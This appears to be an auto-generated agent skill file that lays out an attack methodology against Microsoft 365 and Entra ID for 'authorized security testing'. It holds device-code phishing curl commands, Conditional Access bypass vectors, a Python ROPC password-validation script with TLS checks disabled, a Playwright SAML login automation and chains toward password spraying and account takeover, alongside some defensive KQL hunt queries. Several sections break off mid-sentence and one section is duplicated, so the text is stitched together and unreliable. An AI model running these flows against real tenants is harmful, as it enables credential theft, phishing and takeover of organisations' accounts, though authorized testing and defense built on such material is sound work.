---
name: bbhunt-m365-entra-attack
description: "Hunt AADSTS enumeration, Smart Lockout behavior, CA bypass, ROPC and SAML SSO flaws. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Microsoft 365 and Entra ID attack chain — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs, misconfigs to look for

- **Device-code phishing is the dominant 2025-2026 M365 initial-access primitive (extends the AADSTS table).** Storm-2372 (Feb 2025), Volexity's Russian-actor campaigns, the AI-automated **EvilTokens** PhaaS wave (Microsoft, Apr 2026), **MadApe** kit (Group-IB, Oct 2026), and UTA0352's VS Code-flow variant (`insiders.vscode.dev` redirect). New log markers: `AuthenticationProtocol: deviceCode`, `originalTransferMethod: deviceCodeFlow`, `Call has "Cmsi:cmsi"` in `EntraIdSigninEvents`, and **AADSTS50199** (user pause to enter the code) followed by a success within ~5 minutes. On compromised accounts: device registrations named `DESKTOP-<6-8 hex chars>` (differs from Windows' 7 alphanumeric), PRT minting, Graph recon, hidden inbox rules.
- **AADSTS code to add: 50199** — "AADSTS50199: ...provide the code" — the pre-approval state that makes the 50199→success correlation possible. Treat it as the device-code analogue of the existing "53003 means password valid" insight.
- **FIDO/passkey downgrade (Proofpoint, Aug 2025):** Evilginx phishlet spoofs a **Safari-on-Windows** User-Agent, which Entra treats as FIDO-incompatible → FIDO disabled → fallback to Authenticator/SMS/OTP → AiTM captures the session. "Phishing-resistant MFA configured" is therefore not proof of resistance; check whether fallback methods are still allowed.
- **Token-theft constants:** refresh tokens stay valid for weeks/months and **survive password resets**; `revokeSignInSessions` revokes refresh tokens but exis

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

```bash
# Device-code flow initiated by the attacker (RFC 8628) — the primitive behind every 2025-26 kit
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode" \
  -d "client_id=<client-id>&scope=openid+profile+offline_access+https://graph.microsoft.com/.default"
# -> user_code, device_code, verification_uri (https://microsoft.com/devicelogin), expires_in=900
# Victim enters user_code at devicelogin; attacker polls:
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=<client-id>&device_code=<device_code>"
# -> access_token + refresh_token (MFA already satisfied by the victim)
```

```kusto
// Microsoft Defender XDR — device-code phishing hunt (verbatim from MSFT research)
EntraIdSigninEvents
| where ErrorCode in (0, 50199)
| summarize ErrorCodes = make_set(ErrorCode) by AccountUpn, CorrelationId, SessionId, bin(Timestamp, 1h)
| where ErrorCodes has_all (0, 50199)
// Device-code auth from suspicious PaaS IP ranges
EntraIdSigninEvents
| where Call has "Cmsi:cmsi"
| where IPAddress has_any ("162.220.232.", "162.220.234.", "89.150.45.", "185.81.113.", "8.228.105.")
// Token used against Device Registration Service after device-code auth
pname: "Microsoft Entra ID" AND eventName: IDENTITY_IAM_SIGN_INS AND status: 0
  AND rawDataStr: "\"OriginalTransferMethod":"deviceCodeFlow\"" AND targetResourceDisplayName: "Device Registration Service"
```

Fallback-abuse path (FIDO downgr

### Conditional Access bypass options (most blocked, document anyway)

| Vector | Status (2026) | Notes |
|---|---|---|
| Different ROPC client_id (Microsoft Graph PowerShell vs Azure CLI vs Office) | Sometimes works | CA can be per-app; try `1b730954-1685-4b74-9bfd-dac224a7b894` (Graph PS), `04b07795-8ddb-461a-bbee-02f9e1bf7b46` (Azure CLI), `d3590ed6-52b3-4102-aeff-aad2292ab01c` (Office) |
| Different resource (graph.microsoft.com / outlook.office.com / management.azure.com) | Sometimes works | CA scope can be per-resource |
| EWS / IMAP / POP3 / SMTP Basic Auth | Mostly disabled | MS deprecated Basic Auth Oct 2022; per-account exceptions exist |
| FOCI (Family of Client IDs) | Token-refresh path | Use a refresh token from one FOCI client to mint tokens for another |
| Device-code phishing | Works | Requires user-side interaction (OOS for many engagements) |
| Compliant-device emulation | Hard | Requires Intune device registration — high effort, often impossible without insider |
| AiTM session-cookie steal | Works (with phishing) | Modern primary technique — out of scope for non-phishing engagements |
| FOCI + Family Refresh Token Theft | Post-auth | Requires already having a token |
| SAML SSO via different SP | Sometimes | Each enterprise app has its own CA policy; an app with weaker CA = pivot |
| Geo-bypass via VPN | Sometimes | If "trusted location" CA policy includes corp HQ IPs, use a VPN exit there |

**Key insight from this engagement:** in a tenant with universal CA policy (compliant device + MFA), all the above paths return AADSTS53003 with the same flow. The 

### Validation and proof

### ROPC password validation (the canonical test)

**Single-attempt validator pattern (Python):**

```python
import urllib.request, urllib.parse, ssl, time, json, os
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
ATTEMPT_FILE = "engagement_log/o365_attempts.json"
HARD_CAP = 1  # or 2 — never higher

def attempt(email, password):
    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
    if state.get(email.lower(), 0) >= HARD_CAP:
        return {"status": "SKIPPED_CAP"}
    body = urllib.parse.urlencode({
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Microsoft Graph PowerShell
        "client_info": "1",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }).encode()
    state[email.lower()] = state.get(email.lower(), 0) + 1
    json.dump(state, open(ATTEMPT_FILE+".tmp", "w"))
    os.replace(ATTEMPT_FILE+".tmp", ATTEMPT_FILE)  # atomic
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token",
        data=body, method="POST",
    )
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=15)
        body = json.loads(r.read())
        # PARSE AS JSON — see CRITICAL TRAP below about substring matching
        if "access_token" in body:    # ← JSON key check, NOT substring
            return {"status": "VALID", "body": body}
        return {"statu

### SAML SSO browser flow (for definitive cred validation when CA blocks ROPC)

When ROPC returns AADSTS53003, you've proven the password. To prove it across BOTH auth paths (and capture Microsoft's CA-block page as evidence), walk SAML SSO via Playwright:

```python
import asyncio
from playwright.async_api import async_playwright

async def saml_validate(target_sp_url, username, password, screenshot_dir):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--ignore-certificate-errors"])
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()
        # Step 1: navigate to SP
        await page.goto(target_sp_url, wait_until="networkidle", timeout=30000)
        # Step 2: click sign-in (selectors vary per SP)
        for sel in ["button:has-text('Sign in')", "a:has-text('Login')", "button:has-text('Azure')"]:
            try:
                await page.locator(sel).first.click(timeout=3000)
                break
            except: continue
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 3: submit username at Microsoft
        await page.locator('input[name="loginfmt"], input[type="email"]').first.fill(username)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=20000)
        # Step 4: submit password
        await page.locator('input[name="passwd"], input[type="password"]').first.fill(password)
        await page.locator('input[type="submit"], #

### C. Validation / proof bar — how to confirm and avoid false positives

- **Keep the JSON-parsing trap rule from the existing section** — `claims.access_token.capolids` in an AADSTS50076 body still is not a token. Extend it to device-code flows: a `device_code` + `user_code` pair is not a token; only a successful `/token` poll with `access_token`/`refresh_token` counts.
- **Phishing/device-code work requires explicit scope.** Most red-team SOWs exclude phishing; document the primitive via defender-side telemetry and kit analysis (as Microsoft/Group-IB/CSA do) rather than executing against real users. A KQL hit for `deviceCodeFlow` is an IR-grade finding, not an attacker-side win.
- **Prove MFA bypass, don't assume it:** only claim it when you hold a token whose issuance was bound to the victim's MFA completion (device-code poll, AiTM session cookie, stolen refresh token). "MFA enabled" does not equal "MFA enforced on this flow" — check CA exclusions, legacy protocols, and the FIDO fallback path explicitly.
- **Session-fixation false positive guard:** because the device-code session ID is *shared* between victim and attacker, one session ID appearing in two geographies/device contexts is the signal; a single-IP sign-in is not. Track unique token IDs from **non-interactive** sign-in logs to attribute actions.
- **Remediation verification:** revoke sessions + disable the account; password reset alone is insufficient (refresh tokens survive). A clean sign-in log after only a password reset = still compromised.
- **When CA blocks ROPC (AADSTS53003), keep the existing bar:** pa

### Escalation and related chains

### Related Skills & Chains

- **`mfa-and-passwords`** — AADSTS50053 (lockout) vs AADSTS50126 (bad password) vs AADSTS50076 (MFA required) is a free factor-presence oracle. Chain primitive: M365 AADSTS50053 lockout differential observed → user has MFA but no CA enforcement on legacy auth → `mfa-and-passwords` factor-probe (SMS fallback, voice fallback, OAuth device-code flow, ROPC against legacy endpoint) → Conditional Access bypass via legacy-protocol path.
- **`ntlm-info`** — On-prem NTLM topology leak feeds the Entra spray. Chain primitive: SharePoint/Exchange/IIS anon NTLM Type-2 → AV_PAIR decode yields `corp.example.com` → `m365-entra-attack` resolves Entra tenant via openid-configuration → ROPC spray with realistic UPN format.
- **`okta-attack`** — Hybrid orgs run Okta-as-IdP federated into Entra. Chain primitive: M365 `getuserrealm` returns `NameSpaceType: Federated` with AuthURL pointing to `*.okta.com` → pivot to `okta-attack` for tenant enumeration → Okta ATO → SAML assertion to Entra → full M365 access.
- **`saml`** — Federated tenants accept signed SAML assertions; XSW or signature-stripping on the federated IdP bypasses Entra's controls entirely. Chain primitive: `getuserrealm` reveals federation → IdP fingerprinted (ADFS / Okta / PingFederate) → `saml` XSW1-XSW8 against IdP's `/adfs/ls/` or equivalent → forged assertion → Entra grants access.
- **`redteam-report-template`** — M365 findings need clear tenant/user/CA-policy framing because the blast radius is "every Microsoft service the org uses." Chain primitive: validated finding from this skill → run through

### Related Skills & Chains

- **`hunt-mfa-bypass`** — AADSTS50053 (lockout) vs AADSTS50126 (bad password) vs AADSTS50076 (MFA required) is a free factor-presence oracle. Chain primitive: M365 AADSTS50053 lockout differential observed → user has MFA but no CA enforcement on legacy auth → `hunt-mfa-bypass` factor-probe (SMS fallback, voice fallback, OAuth device-code flow, ROPC against legacy endpoint) → Conditional Access bypass via legacy-protocol path.
- **`hunt-ntlm-info`** — On-prem NTLM topology leak feeds the Entra spray. Chain primitive: SharePoint/Exchange/IIS anon NTLM Type-2 → AV_PAIR decode yields `corp.example.com` → `m365-entra-attack` resolves Entra tenant via openid-configuration → ROPC spray with realistic UPN format.
- **`okta-attack`** — Hybrid orgs run Okta-as-IdP federated into Entra. Chain primitive: M365 `getuserrealm` returns `NameSpaceType: Federated` with AuthURL pointing to `*.okta.com` → pivot to `okta-attack` for tenant enumeration → Okta ATO → SAML assertion to Entra → full M365 access.
- **`hunt-saml`** — Federated tenants accept signed SAML assertions; XSW or signature-stripping on the federated IdP bypasses Entra's controls entirely. Chain primitive: `getuserrealm` reveals federation → IdP fingerprinted (ADFS / Okta / PingFederate) → `hunt-saml` XSW1-XSW8 against IdP's `/adfs/ls/` or equivalent → forged assertion → Entra grants access.
- **`redteam-report-template`** — M365 findings need clear tenant/user/CA-policy framing because the blast radius is "every Microsoft service the org uses." Chain primitive: validated finding from this skill → 

### Tools and wordlists

### Tooling

```bash
pip install --break-system-packages msftrecon o365spray  # may need to clone msftrecon from GitHub
brew install pandoc                                       # for report generation
go install -v github.com/projectdiscovery/...             # PD toolkit for general recon
```

Pre-built `m365_validator.py` template at engagement working directory `engagement_log/m365_validator.py`. Adapt the `attempt()` function to your engagement.

---

## Source skills merged into this topic

- `hunting` — `m365-entra-attack`
- `cbh` — `m365-entra-attack`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 1 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 1 merged companion methodology documents
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
